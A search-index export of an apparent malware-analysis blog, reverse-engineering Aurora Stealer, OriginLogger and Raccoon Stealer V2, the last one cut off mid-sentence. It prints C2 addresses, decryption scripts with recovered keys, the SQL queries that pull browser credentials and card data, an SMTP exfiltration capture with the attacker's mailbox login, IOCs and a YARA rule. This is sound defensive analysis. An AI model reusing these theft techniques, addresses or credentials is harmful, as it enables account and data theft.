[{"categories":["Malware Analysis"],"content":"Aurora Stealer","date":"2023-04-12","objectID":"/aurora-stealer/","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Introduction Aurora Stealer is an information stealer Written in GO. It is a commercial stealer that costs around 250$ per month. The malware can steal Browser password and saved cookies, crypto information (Desktop and Web), Telegram, Steam and Specific files from the victim machine and can take a screenshot from it. ","date":"2023-04-12","objectID":"/aurora-stealer/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2023-04-12","objectID":"/aurora-stealer/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Basic information The icon of the executable gives us a hit about how this is spreading. It has Photoshop icon, most probably it was spreading using Malvertising. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Binary Identification First we want to know some basic information about the file so I will use DiE to do so. It was identified as GO binary. .symtab is a legacy section in GO binaries. In GO binaries prior to Version 1.3 .symtab section hold the symbol table but it is no longer filed with anything useful. Without Symbols, the reversing will be so hard as a simple Hello world program in GO has about 2000 function this is a result of that GO compiler statically linking all the needed libraries. Later, I will try to tackle this problem using existed Tools. An important aspect of the basic Triaging of a Malware is to check the readable Strings of the file. But GO is different in everything. The strings has a part of that too. In GO, the strings are stored in Unicode format without null terminating character so many tools will handle that wrong. Also, the existence of this large number of library functions will make it worse. The resulting number of lines using strings utility in Die is 7371 line. We can reduce this number by matching for the library functions like the following Regex .*(runtime|\\/usr|\\/root).*\\n? this matches the lines that contains runtime, usr and root. this filters around 2500 line but still around 5000 line. these lines contains the function imported in program, you can check them but it will be so exhausting to get information from it. Let’s Continue our analysis using the disassembler. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Code Analysis I will upload the sample to IDA to explore it. In the old versions of IDA, Library functions will not be recognized and renamed. Also the types will be mostly wrong. To handle this there is some tools you can use to fix the types and names. I’ve used GoReSym. This is a standalone executable you can run with following parameters GoReSym_win.exe -t -d -p \u003cPATH_TO_FILE\u003e \u003e fix.json for more info about the available parameters, Check the repo of the tool. content of the output is in JSON format so I saved it to use it in this IDA Script to rename the functions and correct the types in IDA database. NOTE: -t parameter fix the types information but if you the decompiler will fail to decompile it. If you want to know how this tool is working, Check this article. Basically it search for pclntab structure by searching for a magic header and follow the pointer to symbols table. // pcHeader holds data used by the pclntab lookups. type pcHeader struct { magic uint32 /* go12magic = 0xfffffffb go116magic = 0xfffffffa go118magic = 0xfffffff0 go120magic = 0xfffffff1 */ pad1, pad2 uint8 // 0,0 minLC uint8 // min instruction size ptrSize uint8 // size of a ptr in bytes nfunc int // number of functions in the module nfiles uint // number of entries in the file tab textStart uintptr // base for function entry PC offsets in this module, equal to moduledata.text funcnameOffset uintptr // offset to the funcnametab variable from pcHeader cuOffset uintptr // offset to the cutab variable from pcHeader filetabOffset uintptr // offset to the filetab variable from pcHeader pctabOffset uintptr // offset to the pctab variable from pcHeader pclnOffset uintptr // offset to the pclntab variable from pcHeader } This is also used by the go parser itself in order to locate the function, For more info here Another set of scripts available we can use it doing the same thing is Alphagolang I will use Alphagolang here but both will provide similar result. First I used recreate_pclntab.py script to recreate pclntab structure. Second, I used function_discovery_and_renaming.py script to rename the functions. Third, I used categorize_go_folders.py to categorize the functions and pack them in folders, This will be very helpful to focus on user-code. Fourth, I used string_cast.py to fix string references. Fifth, I used extract_types.py to correct the types information by applying C like types to the used structures. The result Now, We have a better environment so we can start exploring the code efficiently. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Calling Conventions in GO In function calls, GO has a different calling convention. All the argument are passed using the stack from the left to right. The following assembly code is in Go assembler format func testConv(x,y int) int {return x+y} testConv: MOVQ 0x8(SP), AX ; get arg x MOVQ 0x10(SP), CX ; get arg y ADDQ CX, AX ; %ax \u003c- x + y MOVQ AX, 0x20(SP) ; return x+y-z RET the compiler have to make sure that there is enough space on the stack to accommodate all the arguments and return values. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Strings in GO Go stores strings in a Unicode -UTF-8- format without null terminating characters in a section contain all the strings but. Strings in go stored in structure of value and length pair called StringHeader. So, in all the function where a string argument is passed, you will see an extra argument contain the length of the string. type StringHeader struct { Data uintptr Len int } First we start with main_init function (sub_595590). In GO, init() is a predefined function that takes no argument, Return no values. And Runs before any code in the package. The block number 1 shows that it loads some DLLs and functions. DLL Function user32.dll GetDesktopWindow user32.dll EnumDisplayMonitors user32.dll GetMonitorInfoW user32.dll EnumDisplaySettingsW kernel32.dll LocalFree Crypt32.dll CryptUnprotectData In Block number 2, It Reads the the environment Variable USERPROFILE and concatenate \\\\APPDATA\\\\LOCAL\\ and \\\\APPDATA\\\\ROAMING\\ and save the new string to the memory. In block 3, It did the same thing to get the Paths C:\\\\Users\\\\{user}\\\\APPDATA\\\\ROAMING,\u003cLocal\u003e\\\\ but it replaces the string C:\\\\Users with C:\\\\windows.old\\Users with Replace function from strings package func Replace(original string, old string, new string, n int) string //where n is the number of times replacing occures. -1 for replace all this location is created when the user update from one version to another and it contains all the old information from the previous installation. moving to main_main (sub_595470). It creates a new procedure by making a call to newproc function from runtime package. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Connect To server following the code to main_ConnectToServer (sub_58ABE0). This function has some interesting functionality we will explore next. In block 1, the malware sleeps for 1000000000 nanoseconds -I tried a simple program with the same call to sleep and it was equivalent to time.Nanosecond - Then it establishes a TCP connection to 82.115.223.249:8081 IP address using function Dial from net package. Then it Reads the Received packet. the Dial function in GO returns 2 values, Conn interface and Error, which IDA cannot recognize so, I will follow my intuition. If the connection returned error, it will try to reconnect again. In Block 2, The connection was established but it first checks the response from the remote IP. If it was blocked due to the geo location, as the IP is Russian, it will try to reconnect. If the response was WORK string, the connection is established successfully and the malware can continue with its functionality as shown in block 3 and 4 ","date":"2023-04-12","objectID":"/aurora-stealer/:3:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Collect victim information Moving to main_GetInfoUser() (sub_58B880). The first Lines in this subroutine takes us to another function, main_MachineID (sub_5897A0) The malware Runs the command cmd.exe /c wmic csproduct get uuid to get UUID of the device. Returning to main_GetInfoUser . It retrieves the screen width and height using win32 API GetSystemMetrics , GO allow using third-party packages directly from GitHub and the the cause of the function naming. The screen resolution is represented in the format \u003cwidth\u003ex\u003cheight\u003e . The next call is to main_GetOS (sub_58A530). This function retrieves the OS version using wmic command wmic os get Caption . and filter the output based on the form it is printed to format is in a space separated string. Returning back to main_GetInfoUser a call to main_getGPU (sub_58A200) is made. The GPU information retrieved by executing the command cmd /C wmic path win32_VideoController get name Using the same method in main_getCPU (sub_589F10). It gets CPU information with command cmd /c wmic cpu get name in main_sysTotalMemory (sub_58B550)It gets the memory status by executing GlobalMemoryStatusEx function. main_CMD_SHELL is called to execute cmd /c systeminfo that gets all the specs of the device. That was the last thing the function main_GetInfoUser do. Back in main_main , the function main_grab (sub_593E80) is called. This function responsible for doing the main goal of the malware, Stealing. panic function is used to check for unexpected errors. common use of panic is to abort if a function returns an error value that we don’t want to handle. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"File grabber Going to the first function main_file_grabber (sub_594110) this function search for a specific file taken from the C2 server and it is base64 encoded and in JSON format. Then, It search for the file in some predefined directories and location. the function io_ioutil_ReadDir reads the content of the directory and stores the output in a fs.fileinfo structure , sorted by the filename type FileInfo interface { Name() string // base name of the file Size() int64 // length in bytes for regular files; system-dependent for others Mode() FileMode // file mode bits ModTime() time.Time // modification time IsDir() bool // abbreviation for Mode().IsDir() Sys() any // underlying data source (can return nil) } Then it walks through the returned structure and reads the file of interest then it encode the file content in Base64 and adds the tags used in the JSON formatted packet content to be sent to the remote system ","date":"2023-04-12","objectID":"/aurora-stealer/:3:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Browser data We will visit SendToServer latter. Now, lets go back to the caller function and explore the next function, main_Grab_func3 (sub_58F0B0). This function goes through the %APPDATA%Roaming directory and calls another function. the function path_filepath_Walk walks the directory from the Root passed in the second parameter calling a function fn.WinDirFunc at each file and directory in it including the Root. func Walk(root string, fn WalkFunc) error type WalkFunc func(path string, info fs.FileInfo, err error) error So, Next one to visit is WalkFunc used main_Grab_func3_2 (sub_58DED0). This function steals the Browser information stored For Chromium based browsers it gets the Local State file and calls main_getMasterKey that as the name suggest, Gets the master key and decode it .then, decrypts it by calling CryptUnprotectData which is called from main_xDecrypt It handles the case of using Opera and Firefox browsers Back to the caller function, The malware steals the password and cookies from the browser data and adds the tags of the JSON file to be sent to the C2 server. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Crypto Then, It goes through the %USERPROFILE% searching for any Crypto wallets information It Looks for PC applications and Web based wallets and add its associated type and name to the JSON data to be sent ","date":"2023-04-12","objectID":"/aurora-stealer/:3:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Screenshot Capture function main_Grab_func_7 (sub_591D50) is used to take a screenshot from the victim system The PNG file is then base64 encoded and add the value to the tag screenshot to be sent. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Telegram Data The next targeted information is Telegram, It did the same procedure discussed before with telegram data folder at main_Grab_func_6 (sub_591980) WalkFunc → main_Grab_func_6_2 (sub_591120) ","date":"2023-04-12","objectID":"/aurora-stealer/:3:11","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Steam data function main_Grab_func9 (sub_593B30) steals steam data in the same way ","date":"2023-04-12","objectID":"/aurora-stealer/:3:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"send To server main_SendToServer_NEW (sub_594DD0) is used to send the collected data to the server. The collected information stored in JSON format. the Data then compressed using gzip compression algorithm and encoded with Base64 encoding to be sent to the server using the previously established TCP connection. ","date":"2023-04-12","objectID":"/aurora-stealer/:3:13","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Network Analysis we can look at the network communication using PCAP file provided by Any Run sandbox. By opening the file in Wireshark and filter using the IP 82.115.223.249 Following the TCP stream The first packet received is WORK indicates that the connection is successful and the malware then begin to collect the required data and compress it and send it to the server. At the last packet received from the the C2 server is Thanks. we can use Cyberchef to decode and decompress the data. the Error list include the files that the malware cannot read or access. On of the packets has a very large size, as the screenshot field has a very large Base64 encoded data the screenshot: Sample JSON file can be found here https://pastebin.com/YpTwAC94 ","date":"2023-04-12","objectID":"/aurora-stealer/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Conclusion Aurora stealer is a new commercial infostealer. Most of it’s capabilities are typical things that can be found in most of the stealers. it can grab Browser saved password/cookies and Cryptocurrency wallets information from Desktop applications and Web based wallets. Also, it can grab a files from the victim machine and take a screenshot. The communication with C2 server is done over TCP protocol. Most of these things can be found in most of the stealer But being written in GO makes it special, even it has a plaintext strings, The reversing process is quite annoying as most of the tools cannot handle GO binaries in a right way. ","date":"2023-04-12","objectID":"/aurora-stealer/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"IOCs: 29339458f4a33ee922f25d36b83f19797a15a279634e9c44ebd3816866a541cb 82.115.223[.]249:8081 ","date":"2023-04-12","objectID":"/aurora-stealer/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Yara Rule rule aurora_stealer{ meta: malware = \"Aurora stealer\" hash = \"29339458f4a33ee922f25d36b83f19797a15a279634e9c44ebd3816866a541cb\" reference = \"https://d01a.github.io/\" Author = \"d01a\" strings: $is_go = \"Go build\" ascii $a1 = \"8081\" ascii $a2 = \"C:\\\\Windows.old\\\\Users\\\\\" ascii $a3 = \"\\\\AppData\\\\Roaming\\\\\" ascii $a4 = \"wmic csproduct get uuid\" ascii $a5 = \"wmic cpu get name\" ascii $a6 = \"systeminfo\" ascii $a7 = \"wmic path win32_VideoController get name\" ascii $a8 = \"\\\\AppData\\\\Local\\\\\" ascii $a9 = \"\\\\Opera Stable\\\\Local State\" ascii $a10 = \"coNNNECTIONGWQFGQW\" ascii $fun1 = \"main.Grab\" ascii $fun2 = \"main.getMasterKey\" ascii $fun3 = \"main.SendToServer_NEW\" ascii $fun4 = \"main.ConnectToServer\" ascii $fun5 = \"main.xDecrypt\" ascii $fun6 = \"main.GetDisplayBounds\" ascii condition: uint16(0) == 0x5a4d and filesize \u003e 1000KB and ( $is_go and (8 of ($a*)) and (4 of ($fun*)) ) } ","date":"2023-04-12","objectID":"/aurora-stealer/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"References https://gist.github.com/alexander-hanel/59af86b0154df44a2c9cebfba4996073 The Go Programming Language https://pkg.go.dev/ PCAP file https://dr-knz.net/go-calling-convention-x86-64.html https://dr-knz.net/go-calling-convention-x86-64-2020.html Aurora: a rising stealer flying under the radar - SEKOIA.IO Blog ","date":"2023-04-12","objectID":"/aurora-stealer/:8:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis","date":"2023-01-16","objectID":"/originlogger/","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Conclusion Origin Logger is a variant of Agent tesla, it is build on top of it and uses all of its capabilities. The malware is spreading using spam emails with a malicious attachments. The malware exfiltrate user accounts and passwords and other information from the infected machine. ","date":"2023-01-16","objectID":"/originlogger/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Infection through Email the infection is started with spam email attached by .iso File the .ISO file contains only an executable with a PDF icon. ","date":"2023-01-16","objectID":"/originlogger/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Loader Analysis the ISO file contains .exe file that is likely to be the fist loader. Dropping the executable in Detect It Easy It is a .NET executable and the entropy is not high, Hopefully it will not be packed . So, I will use dnSpyEx to decompile the executable. Going to the Entry Point: there is Three function calls. EnableVisualStyles and SetCompatibleTextRenderingDefault both do not contain anything useful as they are library functions and not written by the author. the third part is creating a instance to Form1 class. The constructor contains two functions: InitializeComponent is used to configure the form, it is not part of the malicious code so let’s continue to Socker function. by exploring the first function, it stores a random string in Text variable and calls Hyper.Array(). Hyper class contains the information we are looking for, a link for the second stage. starting with Array() function which calls GetBuffer() . GetBuffer() just calls Avrql() and passing http://savory.com[.]bd/sav/Ztvfo.png as an argument. Avrql() function downloads the file Ztvfo.png and stores it as an array in the memory and returns that Array. Returning to Array() function which takes the downloaded file in buffer variable and XOR it with the string Sfhdjkpkowgnpcgoshb and stores the XORed data in list array. that’s all for the hyper class, returning back to Socker to check the other function. Void() loads assembly data stored in Tag which is the file downloaded and XORed previously. To run the loaded assembly, Lion() and Ursa are used, both Invokes different namespaces from the randomized string this.richTextBox1.Text = \"Gdbtshcw.Sdnceyzqa Vqyhbeqthicxedwtrnxrbzcq\" ","date":"2023-01-16","objectID":"/originlogger/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Downloading the second stage using the PCAP file provided with the sample to get the second stage. we can use wireshark to do so. to Download the file, navigate to File \u003e Export Objects \u003e HTTP The Content of the this file is Encrypted using XOR cipher as we saw previously. using the following script to decrypt the file import struct s=[] key = b\"Sfhdjkpkowgnpcgoshb\" with open(\"Ztvfo.bin\",'rb') as f: buff = bytearray(f.read()) for i in range(len(buff)): s.append((buff[i] ^ ord(key[i%len(key)]))) with open(\"Ztvfo_out.bin\",'wb') as f: f.write(struct.pack('664576B', *s)) ","date":"2023-01-16","objectID":"/originlogger/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"second stage Analysis Uploading the extracted file to DIE, The executable is obfuscated using .NET Reactor. ","date":"2023-01-16","objectID":"/originlogger/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Network capture analysis from the provided PCAP file of the traffic. Origin Logger exfiltrate the data using SMTP communication. the following is the content of the communication: 220-bh-41.webhostbox.net ESMTP Exim 4.95 #2 Thu, 05 Jan 2023 22:51:30 +0000 220-We do not authorize the use of this system to transport unsolicited, 220 and/or bulk e-mail. EHLO DESKTOP-WIN11PC 250-bh-41.webhostbox.net Hello DESKTOP-WIN11PC [173.66.46.112] 250-SIZE 52428800 250-8BITMIME 250-PIPELINING 250-PIPE_CONNECT 250-AUTH PLAIN LOGIN 250-STARTTLS 250 HELP AUTH login bWFya2V0aW5nQHRyYW5zZ2Vhci5pbg== 334 UGFzc3dvcmQ6 TUBzc3cwcmQjNjIx 235 Authentication succeeded MAIL FROM:\u003cmarketing@transgear.in\u003e 250 OK RCPT TO:\u003czaritkt@arhitektondizajn.com\u003e 250 Accepted DATA 354 Enter message, ending with \".\" on a line by itself MIME-Version: 1.0 From: marketing@transgear.in To: zaritkt@arhitektondizajn.com Date: 5 Jan 2023 22:51:31 +0000 Subject: PW_windows11user/DESKTOP-WIN11PC Content-Type: text/html; charset=us-ascii Content-Transfer-Encoding: quoted-printable Time: 01/05/2023 22:51:26\u003cbr\u003eUser Name: windows11user\u003cbr\u003eComputer= Name: DESKTOP-WIN11PC\u003cbr\u003eOSFullName: Microsoft Windows 11 Pro\u003cbr= \u003eCPU: Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz\u003cbr\u003eRAM: 32165.83 = MB\u003cbr\u003eIP Address: 173.66.46.112\u003cbr\u003e\u003chr\u003eURL:imap://mail.windows11u= sers.com\u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APass= word:EBj%U7-p@q4NW\u003cbr\u003e=0D=0AApplication:Thunderbird\u003cbr\u003e=0D=0A\u003chr\u003e= =0D=0AURL:smtp://mail.windows11users.com\u003cbr\u003e=0D=0AUsername:admin@= windows11users.com\u003cbr\u003e=0D=0APassword:EBj%U7-p@q4NW\u003cbr\u003e=0D=0AApplicat= ion:Thunderbird\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:webmail.windows11users.com= \u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APassword:EBj= %U7-p@q4NW\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL= :https://login.us.coca-cola.com/\u003cbr\u003e=0D=0AUsername:admin@windows1= 1users.com\u003cbr\u003e=0D=0APassword:Zp61-7$r#J_iLpCYV\u0026jKr\u003cbr\u003e=0D=0AAppli= cation:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:https://www.linkedin.= com/\u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APassword= :TqQPvG#0g%$ga_q51\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003ch= r\u003e=0D=0AURL:https://www.amazon.com/ap/signin\u003cbr\u003e=0D=0AUsername:ad= min@windows11users.com\u003cbr\u003e=0D=0APassword:3Fo76#PTf4P$Im!9mkLso69e= T\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:https= ://www.target.com/login\u003cbr\u003e=0D=0AUsername:windows11user\u003cbr\u003e=0D=0APas= sword:c$Kl3wO!e#i7A\u0026!L2\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A= \u003chr\u003e=0D=0AURL:https://myaccount.nytimes.com/auth/login\u003cbr\u003e=0D=0AU= sername:admin@windows11users.com\u003cbr\u003e=0D=0APassword:u*N21Or650yBps= p45awSa\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0A . 250 OK id=1pDZ59-000wFk-B4 QUIT 221 bh-41.webhostbox.net closing connection the exfiltrated data type of data example from the PCAP Current Time 01/05/2023 22:51:26 OS Full Name Microsoft Windows 11 Pro CPU Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz RAM 32165.83 MB IP Address 173.66.46.112 URL imap[://]mail.windows11users[.]com Username admin@windows11users[.]com Password EBj%U7-p@q4NW Application: Edge Chromium AURL=https[://]login.us.coca-cola[.]com/ Username:admin@windows11users[.]com Password:Zp61-7$r#J_iLpCYV\u0026jKr it steals the username and password of the user and send data of the current machine and steals user accounts from different locations like thunderbird and edge browser. ","date":"2023-01-16","objectID":"/originlogger/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"References https://www.malware-traffic-analysis.net/2023/01/05/index.html ","date":"2023-01-16","objectID":"/originlogger/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"File hashes 926a3142270a52f8afb93490d5dd21f0ca23bc0815ee6630068cf6409d8ee448 5016ba92afac1c2b2a2a6b17a09406869bd6f58cfe680f25030af1a1ba1c29a2 90d977ca0a3331d78005912d2b191d26e33fa2c6ef17602d6173164ba83fd85e 3883d374ba0736254a89e310b86f3c3769adcaed471b103b5c0a8a2f16cf5c8d ","date":"2023-01-16","objectID":"/originlogger/:8:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Raccoon Stealer","date":"2022-09-12","objectID":"/raccoon-stealer/","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Conclusion Raccoon Stealer V2 (or RecordBreaker) Is a stealer that provided as a service with about 200$/m. It is a new version of Raccoon stealer that appeared in 2019 and died for a while then it returns with this new Stealer which known as RecordBreaker. It Comes with a lot of capabilities, It can grab a lot of sensitive information like : Steal Victim System information Steal Victim Username and passwords stored in the browser Steal Victim Browser’s Autofill Information Steal Credit Card information Steal Crypto wallets Information Steal Bitcoin Wallets Grab any file from the victim system Take Screenshots from the victim system Load next stage ","date":"2022-09-12","objectID":"/raccoon-stealer/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"First Look First we start with basic analysis, using Detect it easy we see that the file seems to be not packed. Exploring the strings tab, we see a lot of base64 encoded strings and two registry keys SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall and SOFTWARE\\Microsoft\\Cryptography Strings\rtrying to encode the base64 strings will produce encrypted data so i think thats all with basic insights about the executable and lets upload the sample to IDA (and ghidra for decompiling) ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Dynamically resolving DLLs and APIs In the entry function we see two function calls at the very beginning to sub_401000 and sub_404036. by navigating to sub_401000 we see that this function resolve the required APIs dll loaded\r","date":"2022-09-12","objectID":"/raccoon-stealer/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Decrypting the encrypted data After going back to to the entry function, After resolving the APIs there is another function call sub_404036 . This function takes a pattern that seems to be decrypting the data. The sequence is a call to sub_00401806 that calls CryptStringToBinaryA after calling LstrLenA. The call to CryptStringToBinaryA takes a the dwFlags parameter 0x00000001 (CRYPT_STRING_BASE64) which decode the string using base64 encoding routine and returns a byte array contains the base64-decoded encrypted data. decrypt\rafter decrypting the string there are calls to sub_0040A59A function that convert the resulting strings to unicode strings by calling MultiByteToWideChar to get all the decrypted strings we can use the debugger or by making a script to decrypt them for us import base64 from Crypto.Cipher import ARC4 strings = [ 'fVQMox8c','bE8Yjg==','bkoJoy0=','LEtihSAW6eunMDV+Aes3rVhAClFoaQM=',...,'59c9737264c0b3209d9193b8ded6c127','XVHmGYV5cH1pvOC0w/cmantl/oG9aw=='] key = \"edinayarossiya\".encode('utf-8') for i in strings: cipher = ARC4.new(key) print(cipher.decrypt(base64.b64decode(i.encode('utf-8')))) the decrypted strings: tlgrm_ ews_ grbr_ %s\\tTRUE\\t%s\\t%s\\t%s\\t%s\\t%s\\n URL:%s\\nUSR:%s\\nPASS:%s\\n \\t\\t%d) %s\\n \\t- Locale: %s\\n \\t- OS: %s\\n \\t- RAM: %d MB\\n \\t- Time zone: %c%ld minutes from GMT\\n \\t- Display size: %dx%d\\n \\t- Architecture: x%d\\n \\t- CPU: %s (%d cores)\\n \\t- Display Devices:\\n%s\\n formhistory.sqlite logins.json \\\\autofill.txt \\\\cookies.txt \\\\passwords.txt Content-Type: application/x-www-form-urlencoded; charset=utf-8 Content-Type: multipart/form-data; boundary= Content-Type: text/plain; User Data wallets wlts_ ldr_ scrnsht_ sstmnfo_ token: nss3.dll sqlite3.dll SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion PATH ProductName Web Data sqlite3_prepare_v2 sqlite3_open16 sqlite3_close sqlite3_step sqlite3_finalize sqlite3_column_text16 sqlite3_column_bytes16 sqlite3_column_blob SELECT origin_url, username_value, password_value FROM logins SELECT host_key, path, is_secure , expires_utc, name, encrypted_value FROM cookies SELECT name, value FROM autofill pera Stable SELECT host, path, isSecure, expiry, name, value FROM moz_cookies SELECT fieldname, value FROM moz_formhistory cookies.sqlite machineId= \u0026configId= \"encrypted_key\":\" stats_version\":\" Content-Type: application/x-object Content-Disposition: form-data; name=\"file\"; filename=\" POST MachineGuid image/jpeg GdiPlus.dll Gdi32.dll GdiplusStartup GdipDisposeImage GdipGetImageEncoders GdipGetImageEncodersSize GdipCreateBitmapFromHBITMAP GdipSaveImageToFile BitBlt CreateCompatibleBitmap CreateCompatibleDC DeleteObject GetObjectW SelectObject SetStretchBltMode StretchBlt SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards NUM:%s\\nHOLDER:%s\\nEXP:%s/%s\\n \\\\CC.txt NSS_Init NSS_Shutdown PK11_GetInternalKeySlot PK11_FreeSlot PK11_Authenticate PK11SDR_Decrypt SECITEM_FreeItem hostname\":\" \",\"httpRealm\": encryptedUsername\":\" \",\"encryptedPassword\":\" \",\"guid\": Profiles b\"\\xee\\xefV\u003e\\x0c\\xb5Ge\\xb6,A\\xef\\x87=g)'\\x99\\x0c\\xbf7iT\\xfd\" b'Ti\\x8d\\xc8\\xf7:\\xdc\\x9f\\xeb\\xff\\xdc\\xef\\xb1\\x154\\xb4*\\x00\\x87\\xd9\\xf0q' as we can see, the last two strings seems not to be decrypted. If we go back the start function we see that the string 59c9737264c0b3209d9193b8ded6c127 is a different key used to decrypt the string XVHmGYV5cH1pvOC0w/cmantl/oG9aw== and the decrypted string is http://51.195.166.184/ there are some other decryption routines using the same key but the strings are empty. then, the attacker retrieves the locale name which is \u003clanguage\u003e-\u003cREGION\u003e and compare it against ru for some reason, but the flow didn’t changed if it is! The attacker open a mutex with a name 8724643052 and if it existed, the malware terminate itself and if it is not existed it creates a mutex with that name. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Alert the server with a new victim Info The next call is to check if the victim running as local system by making a call to GetTokenInformation to retrieve the token user data that include SID and then check this SID 